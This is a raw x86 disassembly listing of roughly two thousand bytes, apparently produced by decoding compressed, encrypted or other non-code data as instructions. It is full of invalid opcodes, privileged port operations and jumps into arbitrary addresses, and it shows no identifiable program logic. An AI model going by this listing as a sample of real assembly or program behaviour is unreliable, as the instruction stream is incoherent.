  41d5c2:	push   0xb6c4c424
  41d5c7:	ficom  DWORD PTR [ebp+0x7e]
  41d5ca:	mov    dh,0xdc
  41d5cc:	fwait
  41d5cd:	and    BYTE PTR [eax+0x45896023],bl
  41d5d3:	stc    
  41d5d4:	popa   
  41d5d5:	add    al,0x9c
  41d5d7:	mov    esi,0x4f278ea4
  41d5dc:	loope  0x41d650
  41d5de:	pop    ss
  41d5df:	es push edi
  41d5e1:	adc    BYTE PTR [edx-0x69],ah
  41d5e4:	aam    0x56
  41d5e6:	gs push 0x22
  41d5e9:	push   es
  41d5ea:	mov    ebx,0x259697f7
  41d5ef:	xor    ch,dh
  41d5f1:	xor    BYTE PTR [ebx-0x5f52f44f],ah
  41d5f7:	jno    0x41d59b
  41d5f9:	xchg   edi,eax
  41d5fa:	push   DWORD PTR [eax]
  41d5fc:	std    
  41d5fd:	dec    esp
  41d5fe:	stos   DWORD PTR es:[edi],eax
  41d5ff:	js     0x41d5ad
  41d601:	adc    al,0x24
  41d603:	xchg   DWORD PTR [ecx+ecx*8-0x621bdcbf],eax
  41d60a:	mov    edi,0x368f9320
  41d60f:	and    edx,DWORD PTR [ebp+0x4e]
  41d612:	(bad)  
  41d613:	jmp    0x41d682
  41d615:	lahf   
  41d616:	xlat   BYTE PTR ds:[ebx]
  41d617:	inc    ecx
  41d618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d619:	out    0x8f,eax
  41d61b:	mov    bl,0xe
  41d61d:	push   cs
  41d61e:	int3   
  41d61f:	out    dx,eax
  41d620:	xchg   dh,ch
  41d622:	cmp    DWORD PTR [ecx+eiz*1],esp
  41d625:	xlat   BYTE PTR ds:[ebx]
  41d626:	sbb    DWORD PTR [eax+0x76a9396a],0xac69266b
  41d630:	outs   dx,BYTE PTR ds:[esi]
  41d631:	mov    eax,ds:0xdacedbdf
  41d636:	xchg   esp,eax
  41d637:	stos   DWORD PTR es:[edi],eax
  41d638:	xor    BYTE PTR ds:0xebebf025,dl
  41d63e:	in     al,dx
  41d63f:	dec    eax
  41d640:	cdq    
  41d641:	push   esi
  41d642:	cdq    
  41d643:	cwde   
  41d644:	outs   dx,DWORD PTR ds:[esi]
  41d645:	mov    WORD PTR [ebx],fs
  41d647:	mov    ch,0xe
  41d649:	and    al,0x4
  41d64b:	shr    ecx,1
  41d64d:	bound  esi,QWORD PTR [ebx-0x36c7d47a]
  41d653:	cmp    BYTE PTR [ecx+eax*2+0x78],dh
  41d657:	iret   
  41d658:	je     0x41d674
  41d65a:	daa    
  41d65b:	xor    ah,BYTE PTR [ecx]
  41d65d:	inc    edx
  41d65e:	xchg   ebp,eax
  41d65f:	(bad)  
  41d660:	pop    ecx
  41d661:	jg     0x41d6d1
  41d663:	or     eax,0x2feb6dd8
  41d668:	dec    ebp
  41d669:	out    dx,eax
  41d66a:	mov    BYTE PTR [ebp+0x76],bh
  41d66d:	imul   edx,DWORD PTR [ebx+eax*1-0x4e],0x0
  41d672:	cmp    ah,bl
  41d674:	pop    ecx
  41d675:	js     0x41d624
  41d677:	adc    ah,dh
  41d679:	imul   esp,DWORD PTR [eax+ecx*2-0x715283aa],0xffffffa9
  41d681:	hlt    
  41d682:	inc    edi
  41d683:	mov    cl,0x37
  41d685:	xchg   edi,eax
  41d686:	repnz cs mov edi,0x17ded96c
  41d68d:	mov    ecx,0x155185e9
  41d692:	inc    eax
  41d693:	adc    al,cl
  41d695:	iret   
  41d696:	mov    ah,dh
  41d698:	aad    0x42
  41d69a:	and    ah,BYTE PTR [edx+0x22]
  41d69d:	rcr    DWORD PTR [edi],1
  41d69f:	cmp    al,BYTE PTR [ebx]
  41d6a1:	add    al,0x3b
  41d6a3:	fstp   st(2)
  41d6a5:	dec    ebp
  41d6a6:	inc    ebp
  41d6a7:	addr16 gs pop edx
  41d6aa:	pusha  
  41d6ab:	data16 jecxz 0x41d64b
  41d6ae:	lods   al,BYTE PTR ds:[esi]
  41d6af:	icebp  
  41d6b0:	push   ss
  41d6b1:	inc    edx
  41d6b2:	lods   eax,DWORD PTR ds:[esi]
  41d6b3:	xor    esp,DWORD PTR [eax]
  41d6b5:	or     ebx,edi
  41d6b7:	dec    ebx
  41d6b8:	hlt    
  41d6b9:	sub    al,0xfd
  41d6bb:	and    ecx,DWORD PTR ds:[ebx]
  41d6be:	cdq    
  41d6bf:	inc    esi
  41d6c0:	ficom  DWORD PTR [edi]
  41d6c2:	mov    ebp,0x9ec1af09
  41d6c7:	sub    DWORD PTR [eax+0x66],0x10
  41d6cb:	in     al,dx
  41d6cc:	jne    0x41d675
  41d6ce:	(bad)  
  41d6cf:	cmp    edx,DWORD PTR [edi+0x1b5b426]
  41d6d5:	and    eax,0x897b1a8e
  41d6da:	dec    ebp
  41d6db:	mov    esi,0xf9e1f55e
  41d6e0:	sub    DWORD PTR [ecx+0x1e],ebp
  41d6e3:	imul   edx,DWORD PTR [eax],0xda31a0c7
  41d6e9:	les    ebx,FWORD PTR [ecx]
  41d6eb:	aaa    
  41d6ec:	(bad)  
  41d6ed:	mov    ds:0x3e66c7e4,eax
  41d6f2:	sub    esi,DWORD PTR [esi-0x7b0a1585]
  41d6f8:	adc    DWORD PTR es:[ecx],edx
  41d6fb:	es loope 0x41d749
  41d6fe:	icebp  
  41d6ff:	adc    al,0x12
  41d701:	inc    ebp
  41d702:	inc    ecx
  41d703:	sub    eax,0xbb9ee11
  41d708:	pop    ebp
  41d709:	outs   dx,DWORD PTR ds:[esi]
  41d70a:	sbb    al,BYTE PTR [ebx-0x8]
  41d70d:	cmp    cl,dl
  41d70f:	and    al,0x9c
  41d711:	mov    ebp,0x18e68491
  41d716:	dec    esp
  41d717:	mov    ebp,DWORD PTR [edx-0x7b05aafa]
  41d71d:	shr    DWORD PTR [edx+0x3329ce7e],cl
  41d723:	nop
  41d724:	push   eax
  41d725:	jns    0x41d6ae
  41d727:	push   esi
  41d728:	adc    eax,0x679e9502
  41d72d:	pop    ebx
  41d72e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d72f:	cmp    ecx,esi
  41d731:	sbb    BYTE PTR [ebx+0x5c],0xb
  41d735:	rcr    BYTE PTR [ebp-0x5620ea15],cl
  41d73b:	push   esi
  41d73c:	sti    
  41d73d:	or     BYTE PTR [edi+0x44],bl
  41d740:	pop    ebx
  41d741:	sub    BYTE PTR [edx],cl
  41d743:	jnp    0x41d730
  41d745:	mov    ss,edi
  41d747:	out    0x5b,al
  41d749:	xor    eax,0xb4fd751d
  41d74e:	xor    ah,BYTE PTR es:[ecx+0x54]
  41d752:	cmc    
  41d753:	cld    
  41d754:	dec    ecx
  41d755:	sti    
  41d756:	jge    0x41d719
  41d758:	jb     0x41d71a
  41d75a:	and    ah,BYTE PTR ds:0xa98d80c4
  41d760:	call   0xc3439a8a
  41d765:	sbb    ch,bh
  41d767:	shl    DWORD PTR [esp+edx*2-0x5c],0x74
  41d76c:	(bad)  
  41d76d:	sti    
  41d76e:	retf   
  41d76f:	adc    esp,DWORD PTR ds:0x986b2296
  41d775:	jmp    0x41d717
  41d777:	test   al,0x21
  41d779:	mov    edx,0x76063714
  41d77e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d77f:	(bad)  
  41d781:	gs das 
  41d783:	adc    BYTE PTR [ebx],bl
  41d785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d786:	sar    BYTE PTR [edi+0x3b7ada6c],0xd0
  41d78d:	rol    ch,0xae
  41d790:	popf   
  41d791:	mov    eax,0x1e6d2721
  41d796:	xlat   BYTE PTR ds:[ebx]
  41d797:	xchg   esi,eax
  41d798:	push   cs
  41d799:	mov    ah,BYTE PTR [ecx+0x4c]
  41d79c:	push   ebp
  41d79d:	and    BYTE PTR [esi-0x14e7cf8a],dh
  41d7a3:	add    ah,bh
  41d7a5:	outs   dx,DWORD PTR ds:[esi]
  41d7a6:	call   0xbf936dc0
  41d7ab:	mov    ds,ebp
  41d7ad:	idiv   DWORD PTR [edx]
  41d7af:	retf   
  41d7b0:	adc    al,0x14
  41d7b2:	jmp    0x41d7a0
  41d7b4:	add    eax,DWORD PTR [esi]
  41d7b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7b7:	imul   ebp,eax,0x15
  41d7ba:	sbb    eax,0x71c65057
  41d7bf:	pop    es
  41d7c0:	jge    0x41d80e
  41d7c2:	std    
  41d7c3:	push   eax
  41d7c4:	xchg   ebp,eax
  41d7c5:	aaa    
  41d7c6:	es enter 0x323e,0x9d
  41d7cb:	ror    ecx,0xae
  41d7ce:	(bad)  
  41d7cf:	xchg   edx,eax
  41d7d0:	cmc    
  41d7d1:	pop    ecx
  41d7d2:	pop    eax
  41d7d3:	jmp    0x5449:0xabccd759
  41d7da:	push   ecx
  41d7db:	mov    eax,ds:0xf423ac60
  41d7e0:	mov    ds:0x74150b65,al
  41d7e5:	iret   
  41d7e6:	mov    al,0x2e
  41d7e8:	cmc    
  41d7e9:	dec    ecx
  41d7ea:	retf   
  41d7eb:	mov    edi,0xcaa05b09
  41d7f0:	push   ebx
  41d7f1:	scas   eax,DWORD PTR es:[edi]
  41d7f2:	pushf  
  41d7f3:	adc    eax,0xfd0e128c
  41d7f8:	jo     0x41d80e
  41d7fa:	jo     0x41d869
  41d7fc:	jns    0x41d831
  41d7fe:	inc    edi
  41d7ff:	aaa    
  41d800:	or     al,0x2f
  41d802:	popa   
  41d803:	dec    ecx
  41d804:	adc    bh,0x92
  41d807:	push   es
  41d808:	rcr    DWORD PTR [ecx],0xa1
  41d80b:	dec    edi
  41d80c:	bound  ebx,QWORD PTR [edi-0x6c8c887e]
  41d812:	pop    eax
  41d813:	aam    0x58
  41d815:	jmp    0x1ed6:0xbfab815e
  41d81c:	push   edi
  41d81d:	(bad)  
  41d81f:	dec    ebp
  41d820:	ins    BYTE PTR es:[edi],dx
  41d821:	pushf  
  41d822:	mov    esp,0xa0ee6805
  41d827:	add    DWORD PTR [ecx-0x6d],ebp
  41d82a:	inc    edx
  41d82b:	mov    eax,0x26910bfd
  41d830:	cmp    DWORD PTR [edi+0x34],0x94387bcd
  41d837:	jle    0x41d8a5
  41d839:	imul   esi,esp,0x70616ce1
  41d83f:	out    dx,al
  41d840:	sub    bl,ah
  41d842:	int    0xb6
  41d844:	dec    ecx
  41d845:	cld    
  41d846:	add    DWORD PTR [edx-0x2],edi
  41d849:	ds inc ebx
  41d84b:	stos   DWORD PTR es:[edi],eax
  41d84c:	rcr    DWORD PTR [esi+esi*2+0x6],1
  41d850:	jno    0x41d83d
  41d852:	ret    0xe6fa
  41d855:	or     ah,dh
  41d857:	int    0xec
  41d859:	add    DWORD PTR [ebx+0xc],0xffffffa4
  41d85d:	rcr    DWORD PTR [ebx-0x2977a214],cl
  41d863:	imul   eax,edi,0xea7407c0
  41d869:	aad    0xcb
  41d86b:	rcr    ebp,cl
  41d86d:	add    ah,BYTE PTR [esi-0x7a]
  41d870:	mov    dh,BYTE PTR [eax+0x74]
  41d873:	rol    DWORD PTR [edx],0xcc
  41d876:	and    ah,BYTE PTR [ebp+0x33fdb28c]
  41d87c:	xchg   ebx,eax
  41d87d:	arpl   WORD PTR [edx],di
  41d87f:	jp     0x41d823
  41d881:	fiadd  WORD PTR [edi]
  41d883:	inc    ebx
  41d884:	xor    BYTE PTR ds:0x14065e95,dh
  41d88a:	push   edi
  41d88b:	xor    al,0xb1
  41d88d:	sbb    DWORD PTR [eax],eax
  41d88f:	mov    dh,0x9
  41d891:	add    DWORD PTR [eax-0x6d],0x77
  41d895:	(bad)  
  41d896:	ficom  DWORD PTR [esi]
  41d898:	and    ah,BYTE PTR [edi+ebx*8]
  41d89b:	pop    ss
  41d89c:	(bad)  
  41d89d:	mov    ah,BYTE PTR [edx]
  41d89f:	sbb    eax,0xb5a0cb08
  41d8a4:	in     eax,0x3
  41d8a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8a7:	sub    ecx,ebp
  41d8a9:	fnstsw WORD PTR [edx+0x3959a65a]
  41d8af:	sbb    edx,edi
  41d8b1:	imul   edx,DWORD PTR [ebx+esi*4],0x3fd6dd23
  41d8b8:	dec    eax
  41d8b9:	add    dh,BYTE PTR [eax-0x1d]
  41d8bc:	shr    DWORD PTR [esi],1
  41d8be:	fmul   QWORD PTR [eax]
  41d8c0:	ret    
  41d8c1:	gs in  eax,0x94
  41d8c4:	add    al,0x49
  41d8c6:	sbb    esp,0xa70482dc
  41d8cc:	push   es
  41d8cd:	pop    edi
  41d8ce:	test   eax,0x2d2f1680
  41d8d3:	cmp    eax,0x35732b5e
  41d8d8:	inc    bl
  41d8da:	jmp    0x41d863
  41d8dc:	int3   
  41d8dd:	imul   ecx,DWORD PTR [edx],0x7bc2077b
  41d8e3:	out    0x90,eax
  41d8e5:	(bad)  
  41d8e6:	jbe    0x41d923
  41d8e8:	repz inc ebp
  41d8ea:	xor    esi,DWORD PTR [edi+0x4a42cbd6]
  41d8f0:	push   es
  41d8f1:	es jle 0x41d8ae
  41d8f4:	push   esp
  41d8f5:	mov    ds:0xaa8141c0,eax
  41d8fa:	popa   
  41d8fb:	push   edi
  41d8fc:	shl    DWORD PTR [ebx],1
  41d8fe:	mov    edi,0xe43c463e
  41d903:	jns    0x41d933
  41d905:	stos   BYTE PTR es:[edi],al
  41d906:	dec    edi
  41d907:	add    ecx,DWORD PTR [edx]
  41d909:	push   esi
  41d90a:	daa    
  41d90b:	clc    
  41d90c:	add    al,0x93
  41d90e:	cs inc ebx
  41d910:	sub    eax,0x977e3556
  41d915:	adc    BYTE PTR [edi+0x3dc929e2],ch
  41d91b:	xchg   DWORD PTR [esp+edx*4-0x6dc30823],esi
  41d922:	call   0xcb8f:0x5fa8e03e
  41d929:	cdq    
  41d92a:	repz inc edi
  41d92c:	call   0x64d5:0x11d7e11b
  41d933:	cmp    al,0x88
  41d935:	or     DWORD PTR [ecx],ecx
  41d937:	jl     0x41d92e
  41d939:	in     eax,dx
  41d93a:	ja     0x41d991
  41d93c:	icebp  
  41d93d:	fiadd  WORD PTR [esi+0x385dbacc]
  41d943:	ret    
  41d944:	stos   DWORD PTR es:[edi],eax
  41d945:	mov    al,0x80
  41d947:	shr    ecx,1
  41d949:	pop    ebx
  41d94a:	stos   BYTE PTR es:[edi],al
  41d94b:	data16 xor BYTE PTR [edx],bh
  41d94e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d94f:	push   cs
  41d950:	inc    ecx
  41d951:	retf   
  41d952:	mov    dl,0xe2
  41d954:	sbb    eax,0x475bae70
  41d959:	push   esi
  41d95a:	mov    eax,ds:0xdb9870ad
  41d95f:	cwde   
  41d960:	add    BYTE PTR [ebx-0x4],ah
  41d963:	xor    eax,0x6cdbd09
  41d968:	inc    edx
  41d969:	sbb    DWORD PTR [ebp+0x11],esp
  41d96c:	adc    bl,BYTE PTR [edx]
  41d96e:	mov    eax,ds:0x355542b2
  41d973:	dec    edx
  41d974:	outs   dx,DWORD PTR ds:[esi]
  41d975:	das    
  41d976:	and    dl,ah
  41d978:	test   esi,esp
  41d97a:	pop    eax
  41d97b:	jb     0x41d97a
  41d97d:	(bad)
  41d980:	dec    ebx
  41d981:	push   ebp
  41d982:	shr    BYTE PTR [edx-0x7cccaad1],0x5b
  41d989:	mov    ds:0x72d1904a,al
  41d98e:	mov    WORD PTR [ecx],?
  41d990:	fcom   DWORD PTR [edi-0x764adf53]
  41d996:	inc    eax
  41d997:	test   al,0x47
  41d999:	pop    es
  41d99a:	fist   DWORD PTR [eax+0x1cc4df5e]
  41d9a0:	sbb    BYTE PTR [edi-0x11dd6006],0xdf
  41d9a7:	inc    ecx
  41d9a8:	rcr    BYTE PTR [esi],1
  41d9aa:	sahf   
  41d9ab:	cmp    eax,DWORD PTR [ecx+ebp*2+0x2d6d82ec]
  41d9b2:	jl     0x41d9b2
  41d9b4:	cdq    
  41d9b5:	ret    
  41d9b6:	mov    WORD PTR [ecx-0x4],ss
  41d9b9:	cmp    esi,ebp
  41d9bb:	mov    bl,0xc5
  41d9bd:	shl    dh,cl
  41d9bf:	mov    cl,0xc1
  41d9c1:	lods   al,BYTE PTR ds:[esi]
  41d9c2:	jne    0x41d9b3
  41d9c4:	xchg   ebp,eax
  41d9c5:	or     dh,BYTE PTR [eax-0x5f]
  41d9c8:	jecxz  0x41d96d
  41d9ca:	inc    edi
  41d9cb:	jne    0x41d94e
  41d9cd:	xor    eax,0xd9277d12
  41d9d2:	leave  
  41d9d3:	inc    ecx
  41d9d4:	xchg   edx,eax
  41d9d5:	push   ds
  41d9d6:	test   BYTE PTR [esi+0x15],bl
  41d9d9:	pop    DWORD PTR [edi+0x22]
  41d9dc:	aam    0x54
  41d9de:	sti    
  41d9df:	fdivr  QWORD PTR [ecx+0x41]
  41d9e2:	cdq    
  41d9e3:	icebp  
  41d9e4:	pushf  
  41d9e5:	pop    eax
  41d9e6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41d9e8:	neg    bl
  41d9ea:	and    eax,DWORD PTR ds:0x4642c865
  41d9f0:	test   DWORD PTR [ebx],ebp
  41d9f2:	mov    ah,0x46
  41d9f4:	mov    ebx,0x738e55af
  41d9f9:	fstp   DWORD PTR [edi-0x26]
  41d9fc:	(bad)  
  41d9fd:	push   ebx
  41d9fe:	arpl   WORD PTR [ecx-0x1ea10ed4],dx
  41da04:	mov    eax,DWORD PTR [edx]
  41da06:	rol    DWORD PTR [edx+0x4c],0x8c
  41da0a:	mov    cs,WORD PTR [esi]
  41da0c:	cli    
  41da0d:	in     eax,0xf5
  41da0f:	cmp    DWORD PTR [ebx],0xe6ff69d4
  41da15:	(bad)  
  41da16:	aam    0xbf
  41da18:	aas    
  41da19:	out    0x64,eax
  41da1b:	push   esp
  41da1c:	nop
  41da1d:	jne    0x41d9fc
  41da1f:	jo     0x41da82
  41da21:	xchg   eax,ebp
  41da23:	jecxz  0x41d9b1
  41da25:	jns    0x41d9b0
  41da27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da28:	mov    WORD PTR [eax-0x7ff8c65],cs
  41da2e:	adc    ecx,esi
  41da30:	les    edx,FWORD PTR [ebx+0x8]
  41da33:	jmp    0xc01f8166
  41da38:	xor    eax,DWORD PTR [edx]
  41da3a:	pop    es
  41da3b:	js     0x41da3d
  41da3d:	adc    al,0x98
  41da3f:	(bad)  
  41da40:	test   eax,0x2d883611
  41da45:	cmp    eax,0xdafd8253
  41da4a:	mov    cl,0x80
  41da4c:	ja     0x41d9d7
  41da4e:	mov    ecx,0x31ae1fa
  41da53:	adc    bl,ah
  41da55:	push   cs
  41da56:	add    cl,BYTE PTR [ebx+esi*8+0x6a6c756]
  41da5d:	ins    BYTE PTR es:[edi],dx
  41da5e:	adc    eax,0xc3bb162b
  41da63:	push   ds
  41da64:	jl     0x41da76
  41da66:	pop    ds
  41da67:	cmp    eax,0x2ae6ce33
  41da6c:	xchg   ebx,eax
  41da6d:	out    dx,al
  41da6e:	test   ebx,esi
  41da70:	(bad)  
  41da71:	cli    
  41da72:	pop    es
  41da73:	mov    bh,0x87
  41da75:	fwait
  41da76:	(bad)  
  41da77:	xchg   ebx,eax
  41da78:	retf   0x7f1f
  41da7b:	pop    es
  41da7c:	les    ebx,FWORD PTR [esi+0x2a32c6aa]
  41da82:	hlt    
  41da83:	ja     0x41da32
  41da85:	hlt    
  41da86:	rcl    BYTE PTR [ecx+0x25],0x7c
  41da8a:	cmp    BYTE PTR [ecx+0x54a0abb3],cl
  41da90:	stos   BYTE PTR es:[edi],al
  41da91:	xor    DWORD PTR [ebx],eax
  41da93:	sbb    DWORD PTR [esi],edx
  41da95:	cmp    DWORD PTR [ebp+0x78],0x4f7b20fd
  41da9c:	sbb    DWORD PTR [ecx],0x71
  41da9f:	jbe    0x41dafb
  41daa1:	das    
  41daa2:	mov    ah,BYTE PTR [esi]
  41daa4:	sbb    dl,BYTE PTR [ebx+0x17]
  41daa7:	push   edi
  41daa8:	jb     0x41da2f
  41daaa:	jns    0x41da85
  41daac:	jmp    DWORD PTR [esi+esi*1-0x67]
  41dab0:	cmp    al,0x51
  41dab2:	out    dx,al
  41dab3:	ror    ch,0x4c
  41dab6:	popf   
  41dab7:	pop    es
  41dab8:	xchg   edi,eax
  41dab9:	xchg   ebp,eax
  41daba:	sbb    eax,0xe2dbdbb3
  41dabf:	jmp    0x41db0f
  41dac1:	(bad)  
  41dac2:	jbe    0x41da86
  41dac4:	imul   edx,DWORD PTR [ebx+0x210242d6],0xe33d2f78
  41dace:	ins    DWORD PTR es:[edi],dx
  41dacf:	sbb    ah,BYTE PTR [ecx-0x60ca29a2]
  41dad5:	cli    
  41dad6:	in     eax,dx
  41dad7:	mov    esp,0x76f66e98
  41dadc:	cld    
  41dadd:	and    bh,cl
  41dadf:	in     eax,dx
  41dae0:	inc    edx
  41dae1:	int    0x64
  41dae3:	aaa    
  41dae4:	xchg   ebp,eax
  41dae5:	xor    eax,0xac85278
  41daea:	or     eax,0x374b5d6e
  41daef:	(bad)  
  41daf0:	mov    dh,0x94
  41daf2:	jge    0x41dadf
  41daf4:	push   0xffffff9e
  41daf6:	loopne 0x41db46
  41daf8:	pop    ebx
  41daf9:	int    0x8b
  41dafb:	ins    DWORD PTR es:[edi],dx
  41dafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dafd:	int    0x64
  41daff:	inc    edi
  41db00:	sbb    BYTE PTR [edx],al
  41db02:	sbb    DWORD PTR [ebx-0x15e74fb1],edx
  41db08:	popa   
  41db09:	stos   DWORD PTR es:[edi],eax
  41db0a:	adc    dh,BYTE PTR [ebx]
  41db0c:	test   BYTE PTR [edx],bh
  41db0e:	je     0x41db0b
  41db10:	push   ebx
  41db11:	adc    al,0xc4
  41db13:	sbb    BYTE PTR [edi+0x7],ch
  41db16:	dec    ebp
  41db17:	sti    
  41db18:	stc    
  41db19:	in     eax,0x27
  41db1b:	xchg   BYTE PTR [edx],bh
  41db1d:	aam    0xb8
  41db1f:	mov    bh,BYTE PTR ds:0xc6a7346b
  41db25:	ds jmp 0x31e51dd1
  41db2b:	rol    BYTE PTR [eax-0x2d6bfb96],1
  41db31:	jmp    0x41daec
  41db33:	xor    al,ch
  41db35:	cmovge esp,DWORD PTR [edx]
  41db38:	pop    eax
  41db39:	and    ebp,DWORD PTR [ecx]
  41db3b:	sahf   
  41db3c:	in     eax,dx
  41db3d:	sbb    al,0x57
  41db3f:	scas   al,BYTE PTR es:[edi]
  41db40:	(bad)  
  41db41:	cdq    
  41db42:	sub    al,ch
  41db44:	test   DWORD PTR [esi],edx
  41db46:	pop    ss
  41db47:	gs retf 0x5ca0
  41db4b:	xor    al,0xfb
  41db4d:	pop    ss
  41db4e:	outs   dx,DWORD PTR ds:[esi]
  41db4f:	xchg   ecx,eax
  41db50:	aam    0xc7
  41db52:	jne    0x41db7e
  41db54:	daa    
  41db55:	nop
  41db56:	or     eax,0xfd39396b
  41db5b:	dec    edx
  41db5c:	(bad)  
  41db5d:	cld    
  41db5e:	mov    ecx,0xe6aa9a5e
  41db63:	enter  0x36af,0xde
  41db67:	mov    al,0x70
  41db69:	jb     0x41db56
  41db6b:	test   eax,0xc2b902af
  41db70:	es inc ebp
  41db72:	cmp    bh,BYTE PTR [ecx+ecx*2+0x11d95ba4]
  41db79:	xor    edi,DWORD PTR [edi+0x1f3cc5d3]
  41db7f:	xchg   edx,eax
  41db80:	xchg   edx,eax
  41db81:	fwait
  41db82:	adc    dl,BYTE PTR ds:0x98e4a3e5
  41db88:	mov    WORD PTR ds:0xa5682ef7,?
  41db8e:	std    
  41db8f:	pushf  
  41db90:	ins    DWORD PTR es:[edi],dx
  41db91:	or     al,0x61
  41db93:	mov    BYTE PTR [edx-0x21007b8b],al
  41db99:	inc    ecx
  41db9a:	(bad)  
  41db9b:	mov    ?,WORD PTR [edi+0x70953b8e]
  41dba1:	add    al,0x4f
  41dba3:	or     BYTE PTR [ecx+0x309f0b0d],bl
  41dba9:	pop    ebp
  41dbaa:	push   edx
  41dbab:	in     eax,0x75
  41dbad:	xlat   BYTE PTR ds:[ebx]
  41dbae:	or     DWORD PTR [edx+0x12],eax
  41dbb1:	or     eax,0xa28bd8b4
  41dbb6:	pop    ebp
  41dbb7:	push   edi
  41dbb8:	fmul   QWORD PTR [eax+eax*8+0x71]
  41dbbc:	(bad)  
  41dbbd:	pop    ds
  41dbbe:	xchg   DWORD PTR [edx],esi
  41dbc0:	mov    ch,0x3c
  41dbc2:	xor    ch,BYTE PTR [edx-0x57]
  41dbc5:	pop    edx
  41dbc6:	xchg   ebp,eax
  41dbc7:	in     al,0x8d
  41dbc9:	or     BYTE PTR [bp+si],0x69
  41dbcd:	jecxz  0x41dc41
  41dbcf:	cmc    
  41dbd0:	bound  edi,QWORD PTR [ebp-0x33]
  41dbd3:	pop    edx
  41dbd4:	sub    DWORD PTR [eax],edx
  41dbd6:	sbb    BYTE PTR [ebp+0x2],ch
  41dbd9:	ficom  WORD PTR [ecx-0x8]
  41dbdc:	and    BYTE PTR [edx+esi*8+0x44],ch
  41dbe0:	dec    ecx
  41dbe1:	clc    
  41dbe2:	lods   ax,WORD PTR ds:[esi]
  41dbe4:	inc    esp
  41dbe5:	and    esp,edi
  41dbe7:	in     eax,0xc
  41dbe9:	not    ebp
  41dbeb:	add    dh,BYTE PTR [ecx+0x57ca04fd]
  41dbf1:	pop    edx
  41dbf2:	mov    ds:0x256ba4be,al
  41dbf7:	lahf   
  41dbf8:	lock add al,dl
  41dbfb:	(bad)  
  41dbfc:	pop    ecx
  41dbfd:	cmp    BYTE PTR [esi],al
  41dbff:	repnz retf 0x17f8
  41dc03:	sub    BYTE PTR [edi-0x24299a7],al
  41dc09:	jno    0x41dbb8
  41dc0b:	dec    esp
  41dc0c:	cld    
  41dc0d:	pop    ds
  41dc0e:	clc    
  41dc0f:	(bad)  
  41dc10:	or     edi,eax
  41dc12:	mov    bh,0xd3
  41dc14:	in     al,0x6c
  41dc16:	xor    DWORD PTR [esi-0x660617a9],ebp
  41dc1c:	shl    BYTE PTR fs:[edx],0x2d
  41dc20:	retf   0xcc6e
  41dc23:	add    esi,DWORD PTR [edi-0x5e]
  41dc26:	pop    esp
  41dc27:	adc    edi,DWORD PTR [ebp+0x77]
  41dc2a:	xchg   BYTE PTR [ebx-0x1f],bh
  41dc2d:	or     eax,0x3160f7eb
  41dc32:	and    edx,edx
  41dc34:	sub    eax,0x37d63b83
  41dc39:	mov    ebp,edi
  41dc3b:	xor    ebp,DWORD PTR [ebp-0x69c2f5]
  41dc41:	in     eax,dx
  41dc42:	(bad)  
  41dc43:	call   FWORD PTR [ebx+0x23615fcf]
  41dc49:	push   ss
  41dc4a:	sub    al,0x9e
  41dc4c:	mul    bh
  41dc4e:	into   
  41dc4f:	xchg   DWORD PTR [edx+0x77],esp
  41dc52:	sub    al,0xad
  41dc54:	test   eax,0x98d03010
  41dc59:	outs   dx,DWORD PTR ds:[esi]
  41dc5a:	cmp    al,0x23
  41dc5c:	ret    0xe653
  41dc5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc60:	jl     0x41dcad
  41dc62:	daa    
  41dc63:	mov    eax,ds:0x714f23d5
  41dc68:	repz test BYTE PTR [edx],al
  41dc6b:	mov    eax,ds:0xca3187a
  41dc70:	cwde   
  41dc71:	and    bl,0xf1
  41dc74:	fdivr  DWORD PTR [ecx+0x6e]
  41dc77:	aaa    
  41dc78:	and    al,0x51
  41dc7a:	retf   
  41dc7b:	fimul  DWORD PTR [edi-0xa2e324b]
  41dc81:	sub    al,0x2e
  41dc83:	cld    
  41dc84:	call   0x484d597a
  41dc89:	call   0xbb67:0x996f816
  41dc90:	mov    cl,0x43
  41dc92:	dec    esi
  41dc93:	mov    esi,0xe6eadf86
  41dc98:	xor    al,0xba
  41dc9a:	jae    0x41dce8
  41dc9c:	das    
  41dc9d:	pushf  
  41dc9e:	pop    es
  41dc9f:	mov    ebx,0x3e3ada96
  41dca4:	xchg   ebp,eax
  41dca5:	or     ebx,esp
  41dca7:	push   edx
  41dca8:	jp     0x41dcc5
  41dcaa:	sbb    dl,bh
  41dcac:	hlt    
  41dcad:	push   ecx
  41dcae:	shr    DWORD PTR [eax+0x67],cl
  41dcb1:	dec    ebp
  41dcb2:	and    bh,ch
  41dcb4:	rcr    bh,cl
  41dcb6:	popf   
  41dcb7:	add    al,0xf9
  41dcb9:	outs   dx,DWORD PTR ds:[esi]
  41dcba:	lods   al,BYTE PTR ds:[esi]
  41dcbb:	mov    ebp,0x9f6c3bbf
  41dcc0:	popa   
  41dcc1:	in     eax,dx
  41dcc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcc3:	(bad)  
  41dcc4:	adc    bl,cl
  41dcc6:	jnp    0x41dcaa
  41dcc8:	sbb    eax,0xefd132bb
  41dccd:	(bad)  
  41dcce:	jmp    0xae9c2a8a
  41dcd3:	pushf  
  41dcd4:	mov    ebp,0x444d2e50
  41dcd9:	out    0x60,eax
  41dcdb:	ror    DWORD PTR [ebx-0x6e251f47],0xb4
  41dce2:	xor    bl,dl
  41dce4:	rcl    DWORD PTR [esi-0x4a328c3d],1
  41dcea:	and    bl,BYTE PTR [esi]
  41dcec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dced:	repz aaa 
  41dcef:	repnz mov esp,0x46c7c672
  41dcf5:	aaa    
  41dcf6:	xchg   ecx,eax
  41dcf7:	ss mov dl,0x1b
  41dcfa:	into   
  41dcfb:	ss int3 
  41dcfd:	dec    edi
  41dcfe:	pop    ebx
  41dcff:	inc    ecx
  41dd00:	ds jae 0x41dd38
